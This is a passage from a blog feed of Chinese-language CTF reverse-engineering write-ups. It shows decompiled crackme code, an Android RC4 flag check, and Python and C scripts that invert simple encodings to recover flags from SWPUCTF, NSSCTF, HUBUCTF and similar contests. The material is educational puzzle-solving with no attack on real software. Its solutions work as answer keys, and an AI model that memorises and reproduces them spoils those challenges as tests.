0).show();</span><br><span class=\"line\">               &#125;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">       &#125;);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>sumval.toString ().equals (&quot;8393931a16db5a00f464a24abe24b17a9040b57d9cb2cbfa6bdc61d12e9b51f2789e8a8ae9406c969118e75e9bc65c4327fbc7c3accdf2c54675b0ddf3e0a6099b1b81046d525495e3a14ff6eae76eddfa1740cd6bd483da0f7684b2e4ec84b371f07bf95f0113eefab12552181dd832af8d1eb220186400c494db7091e402b0&quot;); 需要注意的是这个上面有一个 md5 的信息</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; s=&#x27;8393931a16db5a00f464a24abe24b17a9040b57d9cb2cbfa6bdc61d12e9b51f2789e8a8ae9406c969118e75e9bc65c4327fbc7c3accdf2c54675b0ddf3e0a6099b1b81046d525495e3a14ff6eae76eddfa1740cd6bd483da0f7684b2e4ec84b371f07bf95f0113eefab12552181dd832af8d1eb220186400c494db7091e402b0&#x27;</span><br><span class=\"line\">&gt;&gt;&gt; len(s)</span><br><span class=\"line\">256</span><br><span class=\"line\">&gt;&gt;&gt; 256/32</span><br><span class=\"line\">8.0</span><br></pre></td></tr></table></figure></p>\n<p>相当于 8 段 md5</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s=&#x27;8393931a16db5a00f464a24abe24b17a9040b57d9cb2cbfa6bdc61d12e9b51f2789e8a8ae9406c969118e75e9bc65c4327fbc7c3accdf2c54675b0ddf3e0a6099b1b81046d525495e3a14ff6eae76eddfa1740cd6bd483da0f7684b2e4ec84b371f07bf95f0113eefab12552181dd832af8d1eb220186400c494db7091e402b0&#x27;</span><br><span class=\"line\">for j in range(0,len(s),32):</span><br><span class=\"line\">        print(s[j:j+32])</span><br></pre></td></tr></table></figure></p>\n<p>得到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">8393931a16db5a00f464a24abe24b17a</span><br><span class=\"line\">9040b57d9cb2cbfa6bdc61d12e9b51f2</span><br><span class=\"line\">789e8a8ae9406c969118e75e9bc65c43</span><br><span class=\"line\">27fbc7c3accdf2c54675b0ddf3e0a609</span><br><span class=\"line\">9b1b81046d525495e3a14ff6eae76edd</span><br><span class=\"line\">fa1740cd6bd483da0f7684b2e4ec84b3</span><br><span class=\"line\">71f07bf95f0113eefab12552181dd832</span><br><span class=\"line\">af8d1eb220186400c494db7091e402b0</span><br></pre></td></tr></table></figure></p>\n<p 4aea146e9dc7365e4ec931f547284822=\"\">flag</p>\n<h4 id=\"hgame-2022-week1flagchecker\"><a class=\"anchor\" href=\"#hgame-2022-week1flagchecker\">#</a> [HGAME 2022 week1]flagchecker</h4>\n<p>类名查找找到 main 函数后在</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MainActivity extends AppCompatActivity &#123;</span><br><span class=\"line\">    /* JADX INFO: Access modifiers changed from: protected */</span><br><span class=\"line\">    @Override // android.support.v7.app.AppCompatActivity, android.support.v4.app.FragmentActivity, android.support.v4.app.SupportActivity, android.app.Activity</span><br><span class=\"line\">    public void onCreate(Bundle bundle) &#123;</span><br><span class=\"line\">        super.onCreate(bundle);</span><br><span class=\"line\">        setContentView(R.layout.activity_main);</span><br><span class=\"line\">        ((Button) findViewById(R.id.button)).setOnClickListener(new View.OnClickListener() &#123; // from class: com.example.flagchecker.MainActivity.1</span><br><span class=\"line\">            @Override // android.view.View.OnClickListener</span><br><span class=\"line\">            public void onClick(View view) &#123;</span><br><span class=\"line\">                byte[] bArr = new byte[0];</span><br><span class=\"line\">                try &#123;</span><br><span class=\"line\">                    bArr = MainActivity.encrypt(((EditText) MainActivity.this.findViewById(R.id.editTextTextPersonName)).getText().toString(), &quot;carol&quot;);</span><br><span class=\"line\">                &#125; catch (Exception e) &#123;</span><br><span class=\"line\">                    e.printStackTrace();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                if (Base64.encodeToString(bArr, 0).replace(&quot;\\n&quot;, &quot;&quot;).equals(&quot;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&quot;)) &#123;</span><br><span class=\"line\">                    Toast.makeText(MainActivity.this, &quot;Congratulations!!!&quot;, 1).show();</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                    Toast.makeText(MainActivity.this, &quot;Fail,try again.&quot;, 1).show();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static byte[] encrypt(String str, String str2) throws Exception &#123;</span><br><span class=\"line\">        SecretKeySpec secretKeySpec = new SecretKeySpec(str2.getBytes(), 0, str2.length(), &quot;RC4&quot;);</span><br><span class=\"line\">        Cipher cipher = Cipher.getInstance(&quot;RC4&quot;);</span><br><span class=\"line\">        cipher.init(1, secretKeySpec);</span><br><span class=\"line\">        return cipher.doFinal(str.getBytes());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这里的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=</span><br></pre></td></tr></table></figure></p>\n<p>密钥</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">carol</span><br></pre></td></tr></table></figure></p>\n<p>厨子 rc4 解密得到 flag</p>\n<h4 id=\"swpu-2019easyapp\"><a class=\"anchor\" href=\"#swpu-2019easyapp\">#</a> [SWPU 2019]easyapp</h4>\n",
            "tags": [
                "mobile"
            ]
        },
        {
            "id": "https://lookhui.github.io/REVERSE%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "url": "https://lookhui.github.io/REVERSE%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/",
            "title": "REVERSE刷题记录",
            "date_published": "2023-12-19T12:27:11.000Z",
            "content_html": "<h4 id=\"swpuctf-2021-新生赛re1\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛re1\">#</a> [SWPUCTF 2021 新生赛] re1</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">打开后注意找到main函数</span><br><span class=\"line\">然后看到伪代码如</span><br><span class=\"line\">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char Str2[1008]; // [rsp+20h] [rbp-60h] BYREF</span><br><span class=\"line\">  char Str1[1000]; // [rsp+410h] [rbp+390h] BYREF</span><br><span class=\"line\">  int i; // [rsp+7FCh] [rbp+77Ch]</span><br><span class=\"line\"></span><br><span class=\"line\">  _main();</span><br><span class=\"line\">  strcpy(Str2, &quot;&#123;34sy_r3v3rs3&#125;&quot;);</span><br><span class=\"line\">  printf(&quot;please put your flag:&quot;);</span><br><span class=\"line\">  scanf(&quot;%s&quot;, Str1);</span><br><span class=\"line\">  for ( i = 0; i &lt;= 665; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    if ( Str1[i] == 101 )</span><br><span class=\"line\">      Str1[i] = 51;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  for ( i = 0; i &lt;= 665; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    if ( Str1[i] == 97 )</span><br><span class=\"line\">      Str1[i] = 52;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  if ( strcmp(Str1, Str2) )</span><br><span class=\"line\">    printf(&quot;you are wrong,see again!&quot;);</span><br><span class=\"line\">  else</span><br><span class=\"line\">    printf(&quot;you are right!&quot;);</span><br><span class=\"line\">  system(&quot;pause&quot;);</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个应该是把 str2 的字符替换如 str1 一样，我们按照上面伪代码的思路把这个替换回来</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;  </span><br><span class=\"line\"></span><br><span class=\"line\">#include &lt;string.h&gt;  </span><br><span class=\"line\"></span><br><span class=\"line\">char Str2[1008]; // [rsp+20h] [rbp-60h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">int i; // [rsp+7FCh] [rbp+77Ch]</span><br><span class=\"line\">int main() &#123;  </span><br><span class=\"line\">  strcpy(Str2, &quot;&#123;34sy_r3v3rs3&#125;&quot;);</span><br><span class=\"line\">  for ( i = 0; i &lt;= 665; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    if ( Str2[i] == 51 )</span><br><span class=\"line\">      Str2[i] = 101;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  for ( i = 0; i &lt;= 665; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    if ( Str2[i] == 52 )</span><br><span class=\"line\">      Str2[i] = 97;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  printf(&quot;%s&quot;,Str2);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"nssctf-2022-spring-recruiteasy-c\"><a class=\"anchor\" href=\"#nssctf-2022-spring-recruiteasy-c\">#</a> [NSSCTF 2022 Spring Recruit]easy C</h4>\n<blockquote>\n<p>直接给的源代码</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()&#123;</span><br><span class=\"line\">    char a[]=&quot;wwwwwww&quot;;</span><br><span class=\"line\">    char b[]=&quot;d`vxbQd&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    //try to find out the flag</span><br><span class=\"line\">    printf(&quot;please input flag:&quot;);</span><br><span class=\"line\">    scanf(&quot; %s&quot;,&amp;a);</span><br><span class=\"line\"></span><br><span class=\"line\">    if(strlen(a)!=7)&#123;</span><br><span class=\"line\">        printf(&quot;NoNoNo\\n&quot;);</span><br><span class=\"line\">        system(&quot;pause&quot;);</span><br><span class=\"line\">        return 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    for(int i=0;i&lt;7;i++)&#123;</span><br><span class=\"line\">        a[i]++;</span><br><span class=\"line\">        a[i]=a[i]^2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    if(!strcmp(a,b))&#123;</span><br><span class=\"line\">        printf(&quot;good!\\n&quot;);</span><br><span class=\"line\">        system(&quot;pause&quot;);</span><br><span class=\"line\">        return 0;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    printf(&quot;NoNoNo\\n&quot;);</span><br><span class=\"line\">    system(&quot;pause&quot;);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">    //flag 记得包上 NSSCTF&#123;&#125; 再提交!!!</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>这种题一看都是要求 b 被加密前的字符就是 flag</p>\n</blockquote>\n<blockquote>\n<p>求异或还原直接进行一次异或即可</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;  </span><br><span class=\"line\">#include &lt;string.h&gt;  </span><br><span class=\"line\">  </span><br><span class=\"line\">int main() &#123;  </span><br><span class=\"line\">    char a[] = &quot;d`vxbQd&quot;;  </span><br><span class=\"line\">    char result[20];  // 创建一个足够大的数组来保存结果  </span><br><span class=\"line\">  </span><br><span class=\"line\">    strcpy(result, a);  // 将 a 的内容复制到 result  </span><br><span class=\"line\">  </span><br><span class=\"line\">    // 对 result 进行两次异或操作  </span><br><span class=\"line\">    for (int i = 0; i &lt;7; i++) &#123;  </span><br><span class=\"line\">        result[i]=(result[i]^4)-1;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    // 将还原后的结果打印出来  </span><br><span class=\"line\">    printf(&quot;%s\\n&quot;, result);  </span><br><span class=\"line\">  </span><br><span class=\"line\">    return 0;  </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>因为上面使用了加 1 这里就需要使用减 1 才行</p>\n</blockquote>\n<h4 id=\"litctf-2023世界上最棒的程序员\"><a class=\"anchor\" href=\"#litctf-2023世界上最棒的程序员\">#</a> [LitCTF 2023] 世界上最棒的程序员</h4>\n<blockquote>\n<p I_am_the_best_programmer_ever=\"\">└─$ strings 世界最高のプログラマーです.exe|grep CTF<br />\nHello CTFer~!<br />\nFlag: LitCTF</p>\n<p>直接使用 strings 查找即可或者使用 ida 查看 rdata 段</p>\n</blockquote>\n<h4 id=\"swpuctf-2021-新生赛re2\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛re2\">#</a> [SWPUCTF 2021 新生赛] re2</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char Str2[64]; // [rsp+20h] [rbp-90h] BYREF</span><br><span class=\"line\">  char Str[68]; // [rsp+60h] [rbp-50h] BYREF</span><br><span class=\"line\">  int v7; // [rsp+A8h] [rbp-8h]</span><br><span class=\"line\">  int i; // [rsp+ACh] [rbp-4h]</span><br><span class=\"line\"></span><br><span class=\"line\">  _main();</span><br><span class=\"line\">  strcpy(Str2, &quot;ylqq]aycqyp&#123;&quot;);</span><br><span class=\"line\">  printf(&amp;Format);</span><br><span class=\"line\">  gets(Str);</span><br><span class=\"line\">  v7 = strlen(Str);</span><br><span class=\"line\">  for ( i = 0; i &lt; v7; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    if ( (Str[i] &lt;= 96 || Str[i] &gt; 98) &amp;&amp; (Str[i] &lt;= 64 || Str[i] &gt; 66) )</span><br><span class=\"line\">      Str[i] -= 2;</span><br><span class=\"line\">    else</span><br><span class=\"line\">      Str[i] += 24;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  if ( strcmp(Str, Str2) )</span><br><span class=\"line\">    printf(&amp;byte_404024);</span><br><span class=\"line\">  else</span><br><span class=\"line\">    printf(aBingo);</span><br><span class=\"line\">  system(&quot;pause&quot;);</span><br><span class=\"line\">  return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>源代码如上</p>\n<p>直接修改如下即可</p>\n</blockquote>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;  </span><br><span class=\"line\">#include &lt;string.h&gt;  </span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char Str[68]; // [rsp+60h] [rbp-50h] BYREF</span><br><span class=\"line\">  int v7; // [rsp+A8h] [rbp-8h]</span><br><span class=\"line\">  int i; // [rsp+ACh] [rbp-4h]</span><br><span class=\"line\"></span><br><span class=\"line\">  strcpy(Str, &quot;ylqq]aycqyp&#123;&quot;);</span><br><span class=\"line\">  v7 = strlen(Str);</span><br><span class=\"line\">  for ( i = 0; i &lt; v7; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    if ( (Str[i] &lt;= 96 || Str[i] &gt; 98) &amp;&amp; (Str[i] &lt;= 64 || Str[i] &gt; 66) )</span><br><span class=\"line\">      Str[i] += 2;</span><br><span class=\"line\">    else</span><br><span class=\"line\">      Str[i] -= 24;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  printf(&quot;%s&quot;,Str);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"wustctf-2020level2\"><a class=\"anchor\" href=\"#wustctf-2020level2\">#</a> [WUSTCTF 2020]level2</h4>\n<blockquote>\n<p>拖入 pe 查看发现是 upx 壳子直接使用 upx -d 进行脱壳在 ida32 打开发现 flag 或者使用 strings</p>\n</blockquote>\n<h4 id=\"swpuctf-2021-新生赛非常简单的逻辑题\"><a class=\"anchor\" href=\"#swpuctf-2021-新生赛非常简单的逻辑题\">#</a> [SWPUCTF 2021 新生赛] 非常简单的逻辑题</h4>\n<p>给了一个 python 代码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># flag = &#x27;abcdefgqwrtyuiop&#x27;</span><br><span class=\"line\"># s = &#x27;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#x27;</span><br><span class=\"line\"># result = &#x27;&#x27;</span><br><span class=\"line\"># for i in range(len(flag)):</span><br><span class=\"line\">#     s1 = ord(flag[i])//17</span><br><span class=\"line\">#     s2 = ord(flag[i])%17</span><br><span class=\"line\">#     result += s[(s1+i)%34]+s[-(s2+i+1)%34]</span><br><span class=\"line\"># print(result)</span><br></pre></td></tr></table></figure></p>\n<p>我自己写了一个</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = &#x27;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i&#x27;</span><br><span class=\"line\">s = &#x27;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#x27;</span><br><span class=\"line\">flag = &#x27;&#x27;</span><br><span class=\"line\">flag1=&#x27;&#x27;</span><br><span class=\"line\">for i in range(len(result)):</span><br><span class=\"line\">    for j in range(0,len(s)):</span><br><span class=\"line\">        if result[i]==s[j]:</span><br><span class=\"line\">            flag+=str(j+1)+&quot; &quot;</span><br><span class=\"line\">flag=flag.split(&quot; &quot;)</span><br><span class=\"line\">print(flag)</span><br><span class=\"line\">for i in range(1,len(flag),2):</span><br><span class=\"line\">    flag[i]=str(abs(int(flag[i])-34))</span><br><span class=\"line\">print(flag)</span><br><span class=\"line\">bb=0</span><br><span class=\"line\">for i in range(0,42,2):</span><br><span class=\"line\">    bb+=1</span><br><span class=\"line\">    s1=int(&quot;&quot;.join(flag[i:i+1]))-bb</span><br><span class=\"line\">    s2=int(&quot;&quot;.join(flag[i+1:i+2]))-bb+1</span><br><span class=\"line\">    flag1+=chr(s1*17+s2)</span><br><span class=\"line\">print(flag1)</span><br></pre></td></tr></table></figure></p>\n<p>发现自己写的麻烦的要死</p>\n<p>思路是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#     s1 = ord(flag[i])//17</span><br><span class=\"line\">#     s2 = ord(flag[i])%17</span><br><span class=\"line\">#     result += s[(s1+i)%34]+s[-(s2+i+1)%34</span><br></pre></td></tr></table></figure></p>\n<p>这里的话 result += s [(s1+i)%34]+s [-(s2+i+1)%34 相当于 2 个字符一组</p>\n<p>那可以来利用 s1*17+s2 来进行还原</p>\n<p>在网上我还看到一个简介的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag = &#x27; &#x27;</span><br><span class=\"line\">s = &#x27;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#x27;</span><br><span class=\"line\">result = &#x27;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i&#x27;</span><br><span class=\"line\">for i in range(21):</span><br><span class=\"line\">\t#先找到在原s中对应的索引值，然后再减去附加的i得到s1和s2</span><br><span class=\"line\">    s1 = s.find(result[i*2]) - i</span><br><span class=\"line\">    s2 = 34 - s.find(result[i*2+1]) -i -1</span><br><span class=\"line\">    # result = -(s2+i+1)%34</span><br><span class=\"line\">    # result = 34 - (s2+i+1)%34</span><br><span class=\"line\">    # result + 34*k = 34 - (s2+i+1)</span><br><span class=\"line\">    # s2 = 34 - result -i -1</span><br><span class=\"line\"></span><br><span class=\"line\">    #题目中，s[-(s2+i+1)%34] 得到的是正数，所以此处的s2也应当是正数</span><br><span class=\"line\">    if s2 &lt; 0:</span><br><span class=\"line\">        s2 = s2+34</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        flag += chr(s1*17 + s2)</span><br><span class=\"line\">print(flag)</span><br></pre></td></tr></table></figure></p>\n<p>还有的话就是通过爆破来得到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s = &#x27;wesyvbniazxchjko1973652048@$+-&amp;*&lt;&gt;&#x27;</span><br><span class=\"line\">result1 = &#x27;v0b9n1nkajz@j0c4jjo3oi1h1i937b395i5y5e0e$i&#x27;</span><br><span class=\"line\">result = [result1[i:i+2] for i in range(0,len(result1),2)]</span><br><span class=\"line\">print(result)</span><br><span class=\"line\"></span><br><span class=\"line\">#flag就是&#x27;c&#x27;， 通过c来爆破</span><br><span class=\"line\">flag = &#x27;&#x27;</span><br><span class=\"line\">for i in range(len(result)):</span><br><span class=\"line\">    for c in range(32,127):</span><br><span class=\"line\">        s1 = c // 17</span><br><span class=\"line\">        s2 = c % 17</span><br><span class=\"line\">        flag = s[(s1+i)%34]+s[-(s2+i+1)%34]</span><br><span class=\"line\">        if flag == result[i]:</span><br><span class=\"line\">            print(chr(c),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure></p>\n<p>这里面最欣赏这个爆破太有思路了</p>\n<h4 id=\"hubuctf-2022-新生赛simple_re\"><a class=\"anchor\" href=\"#hubuctf-2022-新生赛simple_re\">#</a> [HUBUCTF 2022 新生赛] simple_RE</h4>\n<p>好家伙这题都不需要用 ida</p>\n<p>使用 strings 打开文件后看到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 